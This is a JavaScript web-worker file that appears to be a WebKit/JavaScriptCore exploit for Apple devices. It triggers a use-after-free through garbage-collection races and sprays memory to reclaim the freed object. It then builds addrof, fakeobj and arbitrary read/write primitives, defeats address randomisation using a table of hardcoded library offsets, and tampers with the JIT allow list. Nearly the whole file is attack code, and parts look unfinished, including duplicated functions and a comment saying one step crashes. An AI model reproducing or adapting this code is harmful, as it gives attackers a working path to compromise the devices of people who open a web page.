let MessageName;
const convBuf = new ArrayBuffer(8);
const u8 = new Uint8Array(convBuf);
const u32 = new Uint32Array(convBuf);
const u64 = new BigUint64Array(convBuf);
const f64 = new Float64Array(convBuf);
p = {};
var p_rce = {
    _root: []
};

function itof(value) {
    u64[0] = BigInt.asUintN(64, value);
    return f64[0];
}
function ftoi(value) {
    f64[0] = value;
    return u64[0];
}
function hex(value) {
    if (typeof value !== "bigint") return String(value);
    return "0x" + value.toString(16);
}
function noPAC(value) {
    return value & 0x7fffffffffn;
}
class Encoder {
    constructor(messageName, destinationID) {
        this.argList = [];
        if (arguments.length) {
            this.messageName = messageName;
            this.destinationID = destinationID;
            this.encode('uint8_t', 0);
            this.encode('uint16_t', this.messageName);
            this.encode('uint64_t', this.destinationID);
        }
    }
    encode(type, value) {
        this.argList.push({
            type,
            value
        });
        return this;
    }
    encode8BitString(str) {
        this.encode('uint32_t', str.length);
        this.encode('bool', true);
        this.argList.push({
            type: 'bytes',
            value: str
        });
        return this;
    }
    encodeNullString() {
        this.encode('uint32_t', 0xffffffff);
        return this;
    }
    static argumentAlignment(arg) {
        switch (arg.type) {
            case 'uint64_t':
            case 'int64_t':
                return 8;
            case 'uint32_t':
            case 'int32_t':
            case 'float':
                return 4;
            case 'uint16_t':
            case 'int16_t':
                return 2;
            case 'uint8_t':
            case 'int8_t':
            case 'bool':
                return 1;
            case 'bytes':
                return 0;
            default:
                ASSERT_NOT_REACHED(`Encoder.argumentAlignment(): unexpected type name: ${arg.type}`);
        }
    }
    static argumentSize(arg) {
        switch (arg.type) {
            case 'uint64_t':
            case 'int64_t':
                return 8;
            case 'uint32_t':
            case 'int32_t':
            case 'float':
                return 4;
            case 'uint16_t':
            case 'int16_t':
                return 2;
            case 'uint8_t':
            case 'int8_t':
            case 'bool':
                return 1;
            case 'bytes':
                if (typeof arg.value == 'string') {
                    return arg.value.length;
                } else {
                    return arg.value.byteLength;
                }
            default:
                ASSERT_NOT_REACHED(`argumentSize(): unexpected type name: ${arg.type}`);
        }
    }
    buffer() {
        if (this.__buffer) return this.__buffer;
        let bufferSize = 0;
        for (const arg of this.argList) {
            const alignment = Encoder.argumentAlignment(arg);
            const remainder = bufferSize % alignment;
            if (remainder) {
                bufferSize += alignment - remainder;
            }
            bufferSize += Encoder.argumentSize(arg);
        }
        const buffer = new ArrayBuffer(bufferSize);
        const view = new DataView(buffer);
        let bufferOffset = 0;
        for (const arg of this.argList) {
            const alignment = Encoder.argumentAlignment(arg);
            const remainder = bufferOffset % alignment;
            if (remainder) {
                bufferOffset += alignment - remainder;
            }
            switch (arg.type) {
                case 'float':
                    view.setFloat32(bufferOffset, arg.value, true);
                    break;
                case 'uint64_t':
                    view.setBigUint64(bufferOffset, arg.value, true);
                    break;
                case 'int64_t':
                    view.setBigInt64(bufferOffset, arg.value, true);
                    break;
                case 'uint32_t':
                    view.setUint32(bufferOffset, arg.value, true);
                    break;
                case 'int32_t':
                    view.setInt32(bufferOffset, arg.value, true);
                    break;
                case 'uint16_t':
                    view.setUint16(bufferOffset, arg.value, true);
                    break;
                case 'int16_t':
                    view.setInt16(bufferOffset, arg.value, true);
                    break;
                case 'uint8_t':
                    view.setUint8(bufferOffset, arg.value);
                    break;
                case 'int8_t':
                    view.setInt8(bufferOffset, arg.value);
                    break;
                case 'bool':
                    view.setInt8(bufferOffset, !!arg.value);
                    break;
                case 'bytes':
                    const buffer_u8 = new Uint8Array(buffer);
                    if (typeof arg.value == 'string') {
                        for (let i = 0; i < arg.value.length; ++i) buffer_u8[bufferOffset + i] = arg.value.charCodeAt(i);
                    } else {
                        for (let i = 0; i < arg.value.byteLength; ++i) buffer_u8[bufferOffset + i] = arg.value[i];
                    }
                    break;
                default:
                    ASSERT_NOT_REACHED(`buffer(): unexpected type name: ${arg.type}`);
            }
            bufferOffset += Encoder.argumentSize(arg);
        }
        return this.__buffer = buffer;
    }
};
async function loadObjcClass(cls) {
    const bitmap = await createImageBitmap(canvas);
    const wrappedBitmap = read64(p.addrof(bitmap) + 0x18n);
    const imagebuffer = read64(wrappedBitmap + 0x10n);
    write64(imagebuffer + 0x20n, cls);
    bitmap.close();
}
let slow_fcall_resolve;

function bigintFromBytes(bytes) {
    for (let i = 0; i < 8; ++i) u8[i] = bytes[i];
    return u64[0];
}
//THIS HAS TO BE DONE IN A WEB WORKER SO THAT IT IS ADDED TO SCRIPT EXECUTION CONTEXTS
self.onmessage = async function (e) {
    const data = e.data;

    switch (data.type) {
        case 'stage1':
            {

                var offsets = {
                    "AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken": 0x1ed745410n,
                    "AVFAudio__OBJC_CLASS__AVSpeechSynthesisMarker": 0x1ed744f30n,
                    "AVFAudio__OBJC_CLASS__AVSpeechSynthesisProviderRequest": 0x1ed744e68n,
                    "AVFAudio__OBJC_CLASS__AVSpeechSynthesisVoice": 0x1ed744f08n,
                    "AVFAudio__OBJC_CLASS__AVSpeechUtterance": 0x1ed744300n,
                    "AXCoreUtilities__DefaultLoader": 0x1ed5a8748n,
                    "CFNetwork__gConstantCFStringValueTable": 0x1ee5a9570n,
                    "CMPhoto__kCMPhotoTranscodeOption_Strips": 0x1e77a3028n,
                    "emptyString": 0x1ed794420n,
                    "Foundation__NSBundleTables_bundleTables_value": 0x1ed43e308n,
                    "free_slabs": 0x1ed4e4e30n,
                    "GPUProcess_singleton": 0x1eb01db60n,
                    "ImageIO__gFunc_CMPhotoCompressionCreateContainerFromImageExt": 0x1ed5697b0n,
                    "ImageIO__gFunc_CMPhotoCompressionCreateDataContainerFromImage": 0x1ed5697a8n,
                    "ImageIO__gFunc_CMPhotoCompressionSessionAddAuxiliaryImage": 0x1ed569738n,
                    "ImageIO__gFunc_CMPhotoCompressionSessionAddAuxiliaryImageFromDictionaryRepresentation": 0x1ed569730n,
                    "ImageIO__gFunc_CMPhotoCompressionSessionAddCustomMetadata": 0x1ed5693b8n,
                    "ImageIO__gFunc_CMPhotoCompressionSessionAddExif": 0x1ed569728n,
                    "ImageIO__gImageIOLogProc": 0x1ee39b008n,
                    "libdyld__gAPIs": 0x1ed0b4010n,
                    "libsystem_c__atexit_mutex": 0x1ed3f0b60n,
                    "mach_task_self_ptr": 0x280a64078n,
                    "mainRunLoop": 0x1ed7ac020n,
                    "pthread_create": 0x1df150ee8n,
                    "runLoopHolder_tid": 0x1ed7bcd08n,
                    "Security__gSecurityd": 0x1ea91d500n,
                    "TextToSpeech__OBJC_CLASS__TtC12TextToSpeech27TTSMagicFirstPartyAudioUnit": 0x1ed96f348n,
                    "WebCore__PAL_getPKContactClass": 0x1ed61cff8n,
                    "WebCore__softLinkDDDFACacheCreateFromFramework": 0x1ed6237d0n,
                    "WebCore__softLinkDDDFAScannerFirstResultInUnicharArray": 0x1ed6238b0n,
                    "WebCore__softLinkMediaAccessibilityMACaptionAppearanceGetDisplayType": 0x1ed6238a0n,
                    "WebCore__softLinkOTSVGOTSVGTableRelease": 0x1ee638020n,
                    "WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts": 0x1eb03ec80n,
                    "libARI_cstring": 0x0n,
                    "libGPUCompilerImplLazy_cstring": 0x24c231870n,
                    "libGPUCompilerImplLazy__invoker": 0x24d0e78b4n,
                    "libsystem_pthread_base": 0x0n,
                    "pthread_linkedit": 0x1fedfc000n,
                    "PerfPowerServicesReader_cstring": 0x0n,
                    "AVFAudio__cfstr_SystemLibraryTextToSpeech": 0x1f3850990n,
                    "dyld__RuntimeState_vtable": 0x1eee9f700n,
                    "JavaScriptCore__jitAllowList": 0x1ed7bea70n,
                    "JavaScriptCore__jitAllowList_once": 0x1ed7be888n,
                    "RemoteGraphicsContextGLWorkQueue": 0x1ed641758n,
                    "WebCore__DedicatedWorkerGlobalScope_vtable": 0x1f141dec8n,
                    "WebCore__initPKContact_once": 0x1ed6245f8n,
                    "WebCore__initPKContact_value": 0x1ed624600n,
                    "WebCore__TelephoneNumberDetector_phoneNumbersScanner_value": 0x1eb084030n,
                    "WebCore__HTMLDocument_vtable": 0x1f1376268n,
                    "DesktopServicesPriv_bss": 0x1ecff4080n,
                    "GetCurrentThreadTLSIndex_CurrentThreadIndex": 0x280c6e460n,
                    "pthread_create_jsc": 0x1998f5688n,
                    "libsystem_kernel__thread_suspend": 0x22ca45238n,
                    "libdyld__dlopen": 0x1800e8350n,
                    "libdyld__dlsym": 0x1800e8444n,
                    "jsc_base": 0x197f59000n,
                    "dyld__dlopen_from_lambda_ret": 0x18011cfc8n,
                    "dyld__signPointer": 0x1801283e4n,
                    "dyld__RuntimeState_emptySlot": 0x18015eb6cn,
                    "WebProcess_ensureGPUProcessConnection": 0x19e16f334n,
                    "WebProcess_gpuProcessConnectionClosed": 0x19e16f628n,
                    "Security__SecKeychainBackupSyncable_block_invoke": 0x1888d9b94n,
                    "Security__SecOTRSessionProcessPacketRemote_block_invoke": 0x1888ee884n,
                    "MediaAccessibility__MACaptionAppearanceGetDisplayType": 0x1b021f5c0n,
                    "JavaScriptCore__globalFuncParseFloat": 0x1991abde8n,
                    "HOMEUI_cstring": 0x1834dbfa1n,
                    "ImageIO__IIOLoadCMPhotoSymbols": 0x185e73768n,
                    "CMPhoto__CMPhotoCompressionCreateContainerFromImageExt_func": 0x1a5a87078n,
                    "CMPhoto__CMPhotoCompressionCreateDataContainerFromImage_func": 0x1a5a87228n,
                    "CMPhoto__CMPhotoCompressionSessionAddAuxiliaryImage_func": 0x1a5a4a570n,
                    "CMPhoto__CMPhotoCompressionSessionAddAuxiliaryImageFromDictionaryRepresentation_func": 0x1a5a4ab94n,
                    "CMPhoto__CMPhotoCompressionSessionAddCustomMetadata_func": 0x1a5a4b2a8n,
                    "CMPhoto__CMPhotoCompressionSessionAddExif_func": 0x1a5a4ace0n,
                }

                function signed32(v) {
                    v &= 0xffffffffn;
                    if (v >= 0x80000000n) return Number(v - 0x100000000n);
                    return Number(v);
                }

                function plausiblePointer(p) {
                    return typeof p === "bigint" &&
                        p >= 0x100000000n &&
                        p < 0x0001000000000000n &&
                        (p & 0x7n) === 0n;
                }

                function buildDSScribblePrimitives(addrof, fakeobj) {
                    const report = {
                        ok: false,
                        stage: "init",
                        reason: "",
                        attempts: 0,
                        scribbleAddr: 0n,
                        vectorRaw: 0n,
                        backingPtr: 0n,
                        secondaryBackingPtr: 0n,
                        proofs: 0,
                    };

                    let read64;
                    let write64;
                    const keepAlive = [];
                    const read64BigUint64 = new BigUint64Array(4);
                    const read64Str = "\u4444".repeat(0x10);
                    void [][read64Str];

                    report.stage = "find-0x20-adjacent-jsobject";
                    let scribbleElement = null;
                    let prevAddr = 0n;
                    for (let i = 0; i < 1000; ++i) {
                        const o = { p1: 1.1, p2: 2.2 };
                        const addr = addrof(o);
                        report.attempts = i + 1;
                        if (addr - prevAddr === 0x20n) {
                            scribbleElement = o;
                            report.scribbleAddr = addr;
                            break;
                        }
                        keepAlive.push(o);
                        prevAddr = addr;
                    }
                    if (!scribbleElement) {
                        report.reason = "could not find adjacent 0x20 JSObject allocation";
                        return { ok: false, report };
                    }

                    let changeScribbleHolder;
                    let changeScribble;
                    let originalCell;

                    try {
                        report.stage = "build-change-scribble";
                        p.addrof = function addrof(o) {
                            boxedArray[0] = obj;
                            return ftoi(unboxedArray[0]);
                        }
                        p.fakeobj = function fakeobj(addr) {
                            unboxedArray[0] = itof(addr);
                            return boxedArray[0];
                        }
                        write16 = function (ptr, u16) {
                            let value = read64(ptr);
                            value &= ~0xffffn;
                            value |= u16;
                            write64(ptr, value);
                        };

                        // Do not log or touch this fake object. It is a placeholder JSValue,
                        // immediately replaced after harvesting a valid DoubleArray cell.
                        changeScribbleHolder = {
                            p1: fakeobj(0x108240700000000n),
                            p2: scribbleElement
                        };
                        changeScribble = fakeobj(addrof(changeScribbleHolder) + 0x10n);

                        scribbleElement.p3 = 1.1;
                        scribbleElement[0] = 1.1;

                        const doubleArrayCell = ftoi(changeScribble[0]);
                        changeScribbleHolder.p1 = fakeobj(doubleArrayCell);
                        originalCell = changeScribble[0];
                    } catch (e) {
                        report.reason = `change scribble failed: ${e.message}`;
                        return { ok: false, report };
                    }

                    write64 = function (addr, value) {
                        addr = BigInt.asUintN(64, addr);
                        value = BigInt.asUintN(64, value);

                        changeScribble[0] = originalCell;
                        changeScribble[1] = itof(addr + 0x10n);

                        if (value === 0n) {
                            scribbleElement.p3 = 1;
                            delete scribbleElement.p3;
                        } else if (value < 0x2000000000000n) {
                            scribbleElement.p3 = fakeobj(value);
                        } else if (value <= 0x7ff2000000000000n ||
                            (value >= 0x8002000000000000n && value <= 0xfff0000000000000n)) {
                            scribbleElement.p3 = itof(value - 0x2000000000000n);
                        } else {
                            const offAddr = addr + 8n;
                            const offVal = read64(offAddr);
                            const lo = signed32(value);
                            const hi = signed32(value >> 32n);
                            scribbleElement.p3 = lo;
                            changeScribble[1] = itof(addr + 0x14n);
                            scribbleElement.p3 = hi;
                            write64(offAddr, offVal);
                        }
                    };
                    write64 = function (addr, value) {
                        addr = BigInt.asUintN(64, addr);
                        value = BigInt.asUintN(64, value);

                        changeScribble[0] = originalCell;
                        changeScribble[1] = itof(addr + 0x10n);

                        if (value === 0n) {
                            scribbleElement.p3 = 1;
                            delete scribbleElement.p3;
                        } else if (value < 0x2000000000000n) {
                            scribbleElement.p3 = fakeobj(value);
                        } else if (value <= 0x7ff2000000000000n ||
                            (value >= 0x8002000000000000n && value <= 0xfff0000000000000n)) {
                            scribbleElement.p3 = itof(value - 0x2000000000000n);
                        } else {
                            const offAddr = addr + 8n;
                            const offVal = read64(offAddr);
                            const lo = signed32(value);
                            const hi = signed32(value >> 32n);
                            scribbleElement.p3 = lo;
                            changeScribble[1] = itof(addr + 0x14n);
                            scribbleElement.p3 = hi;
                            write64(offAddr, offVal);
                        }
                    };


                    try {
                        report.stage = "build-read64-string-window";
                        changeScribble[1] = itof(addrof(read64BigUint64) + 8n);
                        const read64Float64Bytes = ftoi(scribbleElement[1]);
                        read64BigUint64[0] = 0x10000000006n;
                        read64BigUint64[1] = read64Float64Bytes + 0x10n;

                        changeScribble[1] = itof(addrof(read64Str) + 8n);
                        scribbleElement[0] = itof(read64Float64Bytes);

                        read64 = function (addr) {
                            read64BigUint64[1] = BigInt.asUintN(64, addr);
                            return BigInt(read64Str.charCodeAt(0)) |
                                (BigInt(read64Str.charCodeAt(1)) << 16n) |
                                (BigInt(read64Str.charCodeAt(2)) << 32n) |
                                (BigInt(read64Str.charCodeAt(3)) << 48n);
                        };

                        function read32(addr) {
                            read64BigUint64[1] = addr;
                            return (BigInt(read64Str.charCodeAt(0))
                                | BigInt(read64Str.charCodeAt(1)) << 16n);
                        }
                    } catch (e) {
                        report.reason = `read64 setup failed: ${e.message}`;
                        return { ok: false, report };
                    }
                    try {
                        this.read32 = read32;
                        this.read64 = read64;
                        this.write64 = write64;
                        const vm = read64(read64(addrof(globalThis) + 0x10n) + 0x38n);
                        const heap = vm + 0xc0n;
                        const isSafeToCollect = heap + 0x241n;
                        function write8(ptr, u16) {
                            let value = read64(ptr);
                            value &= ~0xffn;
                            value |= u16;
                            write64(ptr, value);
                        };
                        write8(isSafeToCollect, 0n);

                        //postMessage("getting executable!");
                        //THIS PART CRASHES, WE NEED IT TO GET THE CORRECT SLIDE SLIDE 
                        //postMessage("ftoi:" + ftoi (addrof(parseFloat)));
                        //("itof:" + hex(itof(addrof(parseFloat))));
                        const executable =
                            read64(ftoi(itof(addrof(parseFloat) + 0x18n))); //questionable +0x18n?
                        postMessage("executable:" + hex(executable));
                        // test debug
                        //const executable = read64(addrof(parseFloat) + 0x18n);

                        //test debug 

                        globalFuncParseFloat = noPAC(read64(executable + 0x28n));
                        postMessage("globalFuncParseFloat:" + hex(globalFuncParseFloat))
                        const jsc_base = (function () {
                            let jsc_base = globalFuncParseFloat & ~0xfffn;

                            while (1) {
                                read64BigUint64[1] = jsc_base;
                                if (read64Str.charCodeAt(0) == 0xfacf && read64Str.charCodeAt(1) == 0xfeed) {
                                    return jsc_base;
                                }
                                jsc_base -= 0x1000n;
                            }
                        })();
                        postMessage("jsc_base now: " + hex(jsc_base));
                        function parse_adrp(addr) {
                            const x = Number(read32(addr));
                            const immhi = x >> 5 & (1 << 23 - 5 + 1) - 1;
                            const immlo = x >> 29 & 3;
                            const imm = immhi << 14 | immlo << 12;
                            return imm + Math.floor(Number(addr) / 0x1000) * 0x1000;
                        }
                        function parse_add(addr) {
                            const insn = Number(read32(addr));
                            const off = insn >> 10 & (1 << 12) - 1;
                            return off;
                        }
                        function parse_adrp_add(addr, is_ldrb = false) {
                            let res = parse_adrp(addr);
                            let add = parse_add(addr + 4n);
                            return res + add;
                        }
                        slide = globalFuncParseFloat - offsets.JavaScriptCore__globalFuncParseFloat;
                        postMessage("slide:" + hex(slide))
                        for (const key of Object.keys(offsets)) {
                            if (offsets[key] >= 0x100000000n) offsets[key] += slide;
                        }
                        postMessage("offset keys patched with slide");
                        postMessage("[modify JitAllowList]: writing..");
                        write64(offsets.JavaScriptCore__jitAllowList_once, 0xffffffffffffffffn);
                        write64(offsets.JavaScriptCore__jitAllowList + 8n, 1n);
                        postMessage("[modify JitAllowList]: reading..")
                        postMessage("jitAllowList_once:" + hex(read64(offsets.JavaScriptCore__jitAllowList_once)));
                        postMessage("JitAllowList:" + hex(read64(offsets.JavaScriptCore__jitAllowList + 8n)));

                        const contexts = read64(offsets.WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts);
                        const contexts_length = read32(contexts - 4n);
                        postMessage(`contexts_length:${hex(contexts_length)}`);
                        //postMessage({
                        //type: 'prepare_dlopen_workers'
                        //        });

                        let worker;

                        for (let i = 0n; i < contexts_length; ++i) {
                            const scriptExecutionContext = read64(contexts + 0x30n * i + 0x20n);
                            if (!scriptExecutionContext)
                                continue;

                            const vtable = read64(scriptExecutionContext);
                            postMessage("vtable" + hex(noPAC(vtable)));
                            //print(`vtable: ${vtable.noPAC().hex()}    offset:${offsets.WebCore__DedicatedWorkerGlobalScope_vtable.hex()}`);
                            postMessage("offset:" + hex(offsets.WebCore__DedicatedWorkerGlobalScope_vtable))
                            if (noPAC(vtable) != offsets.WebCore__DedicatedWorkerGlobalScope_vtable)
                                continue;
                            postMessage("FOUND CORRECT VTABLE!");
                            break;
                        }
                    } catch (e) {
                        report.reason = `read64 setup failed: ${e.message}`;
                        return { ok: false, report };
                    }
                }


                const rootArray = new Array(0x40_0000).fill(1.1);
                const rootIndex = rootArray.length - 1;
                const reclaimed = [];

                function triggerUAF(flag, k, allocCount) {
                    const A = { p0: 0x41414141, p1: 1.1, p2: 2.2 };
                    rootArray[rootIndex] = A;

                    const forGC = [];
                    const a = new Date(1111);
                    a[0] = 1.1;

                    for (let j = 0; j < allocCount; ++j) {
                        forGC.push(new ArrayBuffer(0x80_0000));
                    }

                    A.p2 = forGC;
                    const b = { p0: 0x42424242, p1: 1.1 };

                    let f = b;
                    if (flag) f = 1.1;

                    A.p1 = f;

                    let v = 1.1;
                    for (let i = 0; i < 1e6; ++i) {
                        for (let j = 0; j < k; ++j) {
                            v = i;
                            v = j;
                        }
                    }

                    b.p0 = v;
                    b.p1 = a;
                }

                function recursive(n) {
                    if (n === 0) return;
                    recursive((n | 0) - 1);
                }

                function safeRecursive(n) {
                    try { recursive(n); } catch (e) { }
                }

                triggerUAF(true, 1, 1);
                triggerUAF(false, 1, 1);

                for (let i = 0; i < 1000; ++i) {
                    triggerUAF(false, 0, 0);
                }

                for (let i = 0; i < 20; ++i) {
                    safeRecursive(800);
                }

                let lastProgress = Date.now();

                for (let k = 0; k < 15000; ++k) {
                    triggerUAF(false, 10, (k % 5) + 1);
                    safeRecursive(800);

                    for (let i = 0; i < 3; ++i) {
                        new ArrayBuffer(0x4000);
                    }

                    let freed;
                    try {
                        freed = rootArray[rootIndex].p1.p1;
                    } catch (e) {
                        continue;
                    }

                    let winningArray = null;
                    const noCow = 13.37;
                    for (let i = 0; i < 64; ++i) {
                        const spray = [13.37, 2.2, 3.3, 4.4, noCow];
                        reclaimed.push(spray);
                        try {
                            if (freed[0] === 13.37) {
                                winningArray = spray;
                                break;
                            }
                        } catch (e) { }
                    }

                    if (!winningArray) {
                        if ((Date.now() - lastProgress) > 1500) {
                            postMessage(`attempt ${k}/15000; reclaimed arrays=${reclaimed.length}`);
                            lastProgress = Date.now();
                            await new Promise(r => setTimeout(r, 1));
                        }
                        continue;
                    }

                    success = true;

                    // Critical primitive setup. Avoid DOM logging until addrof/fakeobj and
                    // the DS scribble proof have finished.
                    const boxedArray = winningArray;
                    boxedArray[0] = {};
                    const unboxedArray = freed;
                    self[0] = unboxedArray;
                    self[1] = boxedArray;

                    function addrof(obj) {
                        boxedArray[0] = obj;
                        return ftoi(unboxedArray[0]);
                    }

                    function fakeobj(addr) {
                        unboxedArray[0] = itof(addr);
                        return boxedArray[0];
                    }
                    var globalFuncParseFloat = 0n;
                    const ds = buildDSScribblePrimitives(addrof, fakeobj);
                    if (ds.ok) {
                        //WE DID IT!
                        postMessage("done");
                    }
                    break;
                }
            }
    }
}
